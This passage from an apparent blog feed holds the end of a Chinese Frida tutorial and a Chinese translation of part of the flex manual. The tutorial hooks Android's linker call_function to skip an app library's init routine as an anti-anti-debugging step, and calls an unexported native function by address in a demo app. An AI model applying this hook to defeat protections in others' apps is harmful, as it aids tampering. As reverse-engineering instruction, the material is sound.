class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> F&gt;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">call_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* array_name __unused,</span></span></span><br><span class="line"><span class="function"><span class="params">                       F* functions,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">bool</span> reverse,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">const</span> <span class="keyword">char</span>* realpath)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (functions == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  TRACE(<span class="string">"[ Calling %s (size %zd) @ %p for '%s' ]"</span>, array_name, count, functions, realpath);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">begin</span> = reverse ? (count - <span class="number">1</span>) : <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">end</span> = reverse ? <span class="number">-1</span> : count;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">step</span> = reverse ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="built_in">begin</span>; i != <span class="built_in">end</span>; i += <span class="built_in">step</span>) &#123;</span><br><span class="line">    TRACE(<span class="string">"[ %s[%d] == %p ]"</span>, array_name, i, functions[i]);</span><br><span class="line">    call_function(<span class="string">"function"</span>, functions[i], realpath);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  TRACE(<span class="string">"[ Done calling %s for '%s' ]"</span>, array_name, realpath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LogPrint</span>(<span class="params">log</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> theDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> hour = theDate.getHours();</span><br><span class="line">    <span class="keyword">var</span> minute = theDate.getMinutes();</span><br><span class="line">    <span class="keyword">var</span> second = theDate.getSeconds();</span><br><span class="line">    <span class="keyword">var</span> mSecond = theDate.getMilliseconds()</span><br><span class="line"></span><br><span class="line">    hour &lt; <span class="number">10</span> ? hour = <span class="string">"0"</span> + hour : hour;</span><br><span class="line">    minute &lt; <span class="number">10</span> ? minute = <span class="string">"0"</span> + minute : minute;</span><br><span class="line">    second &lt; <span class="number">10</span> ? second = <span class="string">"0"</span> + second : second;</span><br><span class="line">    mSecond &lt; <span class="number">10</span> ? mSecond = <span class="string">"00"</span> + mSecond : mSecond &lt; <span class="number">100</span> ? mSecond = <span class="string">"0"</span> + mSecond : mSecond;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> time = hour + <span class="string">":"</span> + minute + <span class="string">":"</span> + second + <span class="string">":"</span> + mSecond;</span><br><span class="line">    <span class="keyword">var</span> threadid = Process.getCurrentThreadId();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"["</span> + time + <span class="string">"]"</span> + <span class="string">"-&gt;threadid:"</span> + threadid + <span class="string">"--"</span> + log);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hooklinker</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> linkername = <span class="string">"linker"</span>;</span><br><span class="line">    <span class="keyword">var</span> call_function_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> arch = Process.arch;</span><br><span class="line">    LogPrint(<span class="string">"Process run in:"</span> + arch);</span><br><span class="line">    <span class="keyword">if</span> (arch.endsWith(<span class="string">"arm"</span>)) &#123;</span><br><span class="line">        linkername = <span class="string">"linker"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        linkername = <span class="string">"linker64"</span>;</span><br><span class="line">        LogPrint(<span class="string">"arm64 is not supported yet!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> symbols = Module.enumerateSymbolsSync(linkername);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="comment">//LogPrint(linkername + "-&gt;" + symbol.name + "---" + symbol.address);</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"__dl__ZL13call_functionPKcPFviPPcS2_ES0_"</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">            call_function_addr = symbol.address;</span><br><span class="line">            LogPrint(<span class="string">"linker-&gt;"</span> + symbol.name + <span class="string">"---"</span> + symbol.address)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (call_function_addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> func_call_function = <span class="keyword">new</span> NativeFunction(call_function_addr, <span class="string">'void'</span>, [<span class="string">'pointer'</span>, <span class="string">'pointer'</span>, <span class="string">'pointer'</span>]);</span><br><span class="line">        Interceptor.replace(<span class="keyword">new</span> NativeFunction(call_function_addr,</span><br><span class="line">            <span class="string">'void'</span>, [<span class="string">'pointer'</span>, <span class="string">'pointer'</span>, <span class="string">'pointer'</span>]), <span class="keyword">new</span> NativeCallback(<span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1, arg2</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> functiontype = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">var</span> functionaddr = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">var</span> sopath = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                functiontype = Memory.readCString(arg0);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (arg1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                functionaddr = arg1;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (arg2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                sopath = Memory.readCString(arg2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> modulebaseaddr = Module.findBaseAddress(sopath);</span><br><span class="line">            LogPrint(<span class="string">"after load:"</span> + sopath + <span class="string">"--start call_function,type:"</span> + functiontype + <span class="string">"--addr:"</span> + functionaddr + <span class="string">"---baseaddr:"</span> + modulebaseaddr);</span><br><span class="line">            <span class="keyword">if</span> (sopath.indexOf(<span class="string">'libnative-lib.so'</span>) &gt;= <span class="number">0</span> &amp;&amp; functiontype == <span class="string">"DT_INIT"</span>) &#123;</span><br><span class="line">                LogPrint(<span class="string">"after load:"</span> + sopath + <span class="string">"--ignore call_function,type:"</span> + functiontype + <span class="string">"--addr:"</span> + functionaddr + <span class="string">"---baseaddr:"</span> + modulebaseaddr);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                func_call_function(arg0, arg1, arg2);</span><br><span class="line">                LogPrint(<span class="string">"after load:"</span> + sopath + <span class="string">"--end call_function,type:"</span> + functiontype + <span class="string">"--addr:"</span> + functionaddr + <span class="string">"---baseaddr:"</span> + modulebaseaddr);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="string">'void'</span>, [<span class="string">'pointer'</span>, <span class="string">'pointer'</span>, <span class="string">'pointer'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hooklinker)</span><br></pre></td></tr></table></figure><p>我调试了一下linker64，因为没有导出call_function的地址，所以不能直接hook符号名，而是要根据偏移去hook，以后再说。<br>其实要看<code>init_array</code>，直接shift+F7去segment里面找<code>.init_array</code>段就可以了，这里主要是为了反反调试，因为可能反调试会加在init_array里，hook call_function就可以让它不加载反调试程序。</p><h3 id="native层未导出函数主动调用（任意符号和地址）"><a href="#native层未导出函数主动调用（任意符号和地址）" class="headerlink" title="native层未导出函数主动调用（任意符号和地址）"></a>native层未导出函数主动调用（任意符号和地址）</h3><p>现在我想要主动调用sakura_add来打印值,可以ida打开找符号，或者根据偏移，总之最终用这个NativePointer指针来初始化一个NativeFunction来调用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line">Java_com_example_ndk_1demo_MainActivity_sakuraWithInt(JNIEnv *env, jobject thiz, jint a, jint b) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement sakuraWithInt()</span></span><br><span class="line">    <span class="keyword">return</span> sakura_add(a,b);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sakura_add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = a+b;</span><br><span class="line">    LOGD(<span class="string">"sakura add a+b:"</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-03-142324.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libnative_lib_addr = Module.findBaseAddress(<span class="string">"libnative-lib.so"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"libnative_lib_addr is :"</span>, libnative_lib_addr);</span><br><span class="line">    <span class="keyword">if</span> (libnative_lib_addr) &#123;</span><br><span class="line">        <span class="keyword">var</span> sakura_add_addr1 = Module.findExportByName(<span class="string">"libnative-lib.so"</span>, <span class="string">"_Z10sakura_addii"</span>);</span><br><span class="line">        <span class="keyword">var</span> sakura_add_addr2 = libnative_lib_addr.add(<span class="number">0x0F56C</span>) ;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"sakura_add_addr1 "</span>, sakura_add_addr1);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"sakura_add_addr2 "</span>, sakura_add_addr2)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sakura_add1 = <span class="keyword">new</span> NativeFunction(sakura_add_addr1, <span class="string">"int"</span>, [<span class="string">"int"</span>, <span class="string">"int"</span>]);</span><br><span class="line">    <span class="keyword">var</span> sakura_add2 = <span class="keyword">new</span> NativeFunction(sakura_add_addr2, <span class="string">"int"</span>, [<span class="string">"int"</span>, <span class="string">"int"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"sakura_add1 result is :"</span>, sakura_add1(<span class="number">200</span>, <span class="number">33</span>));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"sakura_add2 result is :"</span>, sakura_add2(<span class="number">100</span>, <span class="number">133</span>));</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main())</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">libnative_lib_addr is : <span class="number">0x79fa1c5000</span></span><br><span class="line">sakura_add_addr1  <span class="number">0x79fa1d456c</span></span><br><span class="line">sakura_add_addr2  <span class="number">0x79fa1d456c</span></span><br><span class="line">sakura_add1 result is : <span class="number">233</span></span><br><span class="line">sakura_add2 result is : <span class="number">233</span></span><br></pre></td></tr></table></figure><h2 id="C-C-hook"><a href="#C-C-hook" class="headerlink" title="C/C++ hook"></a>C/C++ hook</h2><p>//todo</p><h3 id="Native-JNI层参数打印和主动调用参数构造"><a href="#Native-JNI层参数打印和主动调用参数构造" class="headerlink" title="Native/JNI层参数打印和主动调用参数构造"></a>Native/JNI层参数打印和主动调用参数构造</h3><p>jni的基本类型要通过调用jni相关的api转化成c++对象，才能打印和调用。<br>jni主动调用的时候，参数构造有两种方式，一种是<code>Java.vm.getenv</code>，另一种是hook获取env之后来调用jni相关的api构造参数。</p><h3 id="C-C-编成so并引入Frida调用其中的函数"><a href="#C-C-编成so并引入Frida调用其中的函数" class="headerlink" title="C/C++编成so并引入Frida调用其中的函数"></a>C/C++编成so并引入Frida调用其中的函数</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;致谢&quot;&gt;&lt;a href=&quot;#致谢&quot; class=&quot;headerlink&quot; title=&quot;致谢&quot;&gt;&lt;/a&gt;致谢&lt;/h2&gt;&lt;p&gt;本篇文章学到的内容来自且完全来自r0ysue的知识星球，推荐一下。&lt;br&gt;&lt;img src=&quot;https://sakura-12522362
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="http://eternalsakura13.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
      <category term="frida" scheme="http://eternalsakura13.com/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>Flex中文文档</title>
    <link href="http://eternalsakura13.com/2020/05/27/flex/"/>
    <id>http://eternalsakura13.com/2020/05/27/flex/</id>
    <published>2020-05-27T15:37:03.324Z</published>
    <updated>2020-05-28T10:05:15.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="4-Some-Simple-Examples"><a href="#4-Some-Simple-Examples" class="headerlink" title="4 Some Simple Examples"></a>4 Some Simple Examples</h2><p>首先，通过一些简单的示例来了解使用flex。<br>以下flex输入指定了一个扫描程序scanner，当它遇到字符串’username’将其替换为用户的登录名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%%</span><br><span class="line">username    printf( &quot;%s&quot;, getlogin() );</span><br></pre></td></tr></table></figure><p>默认情况下，任何与flex scanner不匹配的文本都将被复制到输出中，因此，该scanner的最终效果是仅将每次出现的用户名替换了。<br>在此输入中，只有一个规则(rule)。’username’是模式(pattern)，而’print’就是action。’%%’符号标志着rules的开始。<br>另一个简单的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        int num_lines &#x3D; 0, num_chars &#x3D; 0;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">\n      ++num_lines; ++num_chars;</span><br><span class="line">.       ++num_chars;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">        &#123;</span><br><span class="line">        yylex();</span><br><span class="line">        printf( &quot;# of lines &#x3D; %d, # of chars &#x3D; %d\n&quot;,</span><br><span class="line">                num_lines, num_chars );</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>该scanner计算其输入中的字符数和行数。除了有关字符数和行数的最终报告外，它不产生任何输出。<br>第一行声明了两个全局变量，num_lines和num_chars，在第二个%%之后声明的yylex()的main()例程都可以访问它们。<br>有两个规则(rule)，一个匹配换行符(‘\n’)，并同时增加行数和字符数。<br>另一个匹配除了换行符之外的任何字符(通过.正则表达式)</p><p>看一个更复杂的例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* scanner for a toy Pascal-like language *&#x2F;</span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line">&#x2F;* need this for the call to atof() below *&#x2F;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">DIGIT    [0-9]</span><br><span class="line">ID       [a-z][a-z0-9]*</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">&#123;DIGIT&#125;+    &#123;</span><br><span class="line">            printf( &quot;An integer: %s (%d)\n&quot;, yytext,</span><br><span class="line">                    atoi( yytext ) );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#123;DIGIT&#125;+&quot;.&quot;&#123;DIGIT&#125;*        &#123;</span><br><span class="line">            printf( &quot;A float: %s (%g)\n&quot;, yytext,</span><br><span class="line">                    atof( yytext ) );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">if|then|begin|end|procedure|function        &#123;</span><br><span class="line">            printf( &quot;A keyword: %s\n&quot;, yytext );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#123;ID&#125;        printf( &quot;An identifier: %s\n&quot;, yytext );</span><br><span class="line"></span><br><span class="line">&quot;+&quot;|&quot;-&quot;|&quot;*&quot;|&quot;&#x2F;&quot;   printf( &quot;An operator: %s\n&quot;, yytext );</span><br><span class="line"></span><br><span class="line">&quot;&#123;&quot;[^&#123;&#125;\n]*&quot;&#125;&quot;     &#x2F;* eat up one-line comments *&#x2F;</span><br><span class="line"></span><br><span class="line">[ \t\n]+          &#x2F;* eat up whitespace *&#x2F;</span><br><span class="line"></span><br><span class="line">.           printf( &quot;Unrecognized character: %s\n&quot;, yytext );</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">int main( int argc, char **argv )</span><br><span class="line">    &#123;</span><br><span class="line">    ++argv, --argc;  &#x2F;* skip over program name *&#x2F;</span><br><span class="line">    if ( argc &gt; 0 )</span><br><span class="line">            yyin &#x3D; fopen( argv[0], &quot;r&quot; );</span><br><span class="line">    else</span><br><span class="line">            yyin &#x3D; stdin;</span><br><span class="line"></span><br><span class="line">    yylex();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是针对Pascal等语言的简单scanner的开始。它标识不同类型的token并报告所见内容。<br>以下部分将说明此示例的详细信息。</p><h2 id="5-Format-of-the-Input-File"><a href="#5-Format-of-the-Input-File" class="headerlink" title="5 Format of the Input File"></a>5 Format of the Input File</h2><p>flex输入文件包括三部分，由%%分开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">definitions</span><br><span class="line">%%</span><br><span class="line">rules</span><br><span class="line">%%</span><br><span class="line">user code</span><br></pre></td></tr></table></figure><h3 id="5-1-Format-of-the-Definitions-Section"><a href="#5-1-Format-of-the-Definitions-Section" class="headerlink" title="5.1 Format of the Definitions Section"></a>5.1 Format of the Definitions Section</h3><p>该定义部分包含了简单的Name definitions的声明，以及start conditions的声明，这将在后面的章节解释。<br>Name definitions有如下形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name definition</span><br></pre></td></tr></table></figure><p>name是一个以字母或下划线开头的单词，然后是零个或多个字母，数字，’_’，或者’-‘(破折号)。<br>definition从名称后的第一个非空白字符开始，一直到该行的末尾。该definition随后可以使用{definition}，它将扩展为(definition)。例如，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DIGIT    [0-9]</span><br><span class="line">ID       [a-z][a-z0-9]*</span><br></pre></td></tr></table></figure><p>定义“数字“是与一位数字匹配的正则表达式，而’ID’是一个正则表达式，它匹配一个字母，后跟零个或多个字母及数字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;DIGIT&#125;+&quot;.&quot;&#123;DIGIT&#125;*</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([0-9])+&quot;.&quot;([0-9])*</span><br></pre></td></tr></table></figure><p>其可以匹配一个或多个数字，后跟一个’.’,然后跟零个或多个数字。12.34<br>不缩进的注释(以<code>/*</code>开头的行)逐字复制到输出，直到遇到下一个<code>*/</code>。<br>任何缩进文本，或者包括在<code>%{</code>和<code>%}</code>之中的也将逐字复制到输出中(移除<code>%{和%}</code>符号)，<code>％{和％}</code>符号本身必须在行上没有缩进。<br><code>%top</code>块是类似于<code>%{和}%</code>的，但它将块中的代码重定位到生成的文件的顶部(在所有flex定义之前)，<code>%top</code>在当您要定义某些预处理器宏或在生成的代码之前包含某些文件时，该块很有用。单个字符<code>{</code>和<code>}</code>用于分隔<code>%top</code>块，如以下示例所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%top&#123;</span><br><span class="line">    &#x2F;* This code goes at the &quot;top&quot; of the generated file. *&#x2F;</span><br><span class="line">    #include &lt;stdint.h&gt;</span><br><span class="line">    #include &lt;inttypes.h&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>%top</code>允许多个块，并保留其顺序。</p><h3 id="5-2-Format-of-the-Rules-Section"><a href="#5-2-Format-of-the-Rules-Section" class="headerlink" title="5.2 Format of the Rules Section"></a>5.2 Format of the Rules Section</h3><p>Flex输入的 rules section 对以下表格有一系列的规则： </p><table><thead><tr><th>pattern</th><th>action</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>其中 pattern 必须是不缩进的，action 必须开始在同一行。 有关 patterns 和 actions 的进一步描述，请参见Patterns。 </p><p>在rules section中，出现在第一个rule之前的任何缩进或<code>%{ %}</code>括号内的文本都可用于声明scanning routine的局部变量和每次进入scanning routine时执行的(声明之后的)代码。<br>rules section中的其他缩进文本或<code>%{ %}</code>文本仍然复制到输出中，但其含义没有良好定义，并且很可能导致编译时错误(这个特性是为了符合 POSIX 要求。查看 Lex 和 Posix，以获得其他此类特性)。 </p><p> <code>%{</code> 和 <code>%}</code>中包含的任何缩进文本或文本都会被逐字复制到输出中(删除了<code>%{</code>和<code>%}</code>符号)。 <code>%{</code>和<code>%}</code>符号本身必须在该行没有缩进。 </p><h3 id="5-3-Format-of-the-User-Code-Section"><a href="#5-3-Format-of-the-User-Code-Section" class="headerlink" title="5.3 Format of the User Code Section"></a>5.3 Format of the User Code Section</h3><p>用户代码部分仅逐字复制到lex.yy.c。它作为scanner的辅助函数使用。此部分的出现是可选的；如果不存在，则输入文件中的第二个”%%”可以被省略。</p><h3 id="5-4-Comments-in-the-Input"><a href="#5-4-Comments-in-the-Input" class="headerlink" title="5.4 Comments in the Input"></a>5.4 Comments in the Input</h3><p>Flex支持C风格的注释，即：介于<code>/ *</code>和<code>* /</code>之间的任何内容都被认为是注释。Flex遇到注释时，会将整个注释逐字复制到生成的源代码中。注释可能出现在任何地方，但有以下例外情况：</p><ul><li>在需要正则表达式的 flex 中，注释可能不会出现在 Rules 部分。 即：注释可能不会出现在一行的开头，或紧跟在scanner states列表之后。 </li><li>注释不能出现在 Definitions 部分的<code>%option</code>行上。</li></ul><p>如果您希望遵循一个简单的规则，那么始终在新行上开始注释，在开始的<code>/*</code>之前使用一个或多个空格字符。 此规则适用于输入文件的任何位置。下面例子中的所有注释都是有效的: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">&#x2F;* code block *&#x2F;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Definitions Section *&#x2F;</span><br><span class="line">%x STATE_X</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">    &#x2F;* Rules Section *&#x2F;</span><br><span class="line">ruleA   &#x2F;* after regex *&#x2F; &#123; &#x2F;* code block *&#x2F; &#125; &#x2F;* after code block *&#x2F;</span><br><span class="line">        &#x2F;* Rules Section (indented) *&#x2F;</span><br><span class="line">&lt;STATE_X&gt;&#123;</span><br><span class="line">ruleC   ECHO;</span><br><span class="line">ruleD   ECHO;</span><br><span class="line">%&#123;</span><br><span class="line">&#x2F;* code block *&#x2F;</span><br><span class="line">%&#125;</span><br><span class="line">&#125;</span><br><span class="line">%%</span><br><span class="line">&#x2F;* User Code Section *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="6-patterns"><a href="#6-patterns" class="headerlink" title="6 patterns"></a>6 patterns</h2><p> 输入里的patterns是根据一个正则表达式扩展集合来写的:</p><ul><li><p><code>x</code>:  </p><p>  匹配字符<code>x</code></p></li><li><p><code>.</code>:  </p><p>  匹配任意字符(1字节)，除了换行符</p></li><li><p><code>[xyz]</code>:  </p><p>  单个字符类;在该case，表示匹配x或y或z</p></li><li><p><code>[abj-oZ]</code>: </p><p>  具有范围的字符类;在该case表示匹配a或b，或在j-o之中选择一个匹配，或者匹配一个Z</p></li><li><p><code>[^A-Z]</code>:</p><p>  否定字符类，即除该类之外的任何字符;在该case表示不匹配大写字母</p></li><li><p><code>[^A-Z\n]</code>: </p><p>  不匹配大写字母和回车</p></li><li><p><code>[a-z]{-}[aeiou]</code>: </p><p>  匹配除了元音字母之外的字符</p></li><li><p><code>r*</code>  </p><p>  r是一个正则表达式, 匹配零次或多次</p></li><li><p><code>r+</code> </p><p>  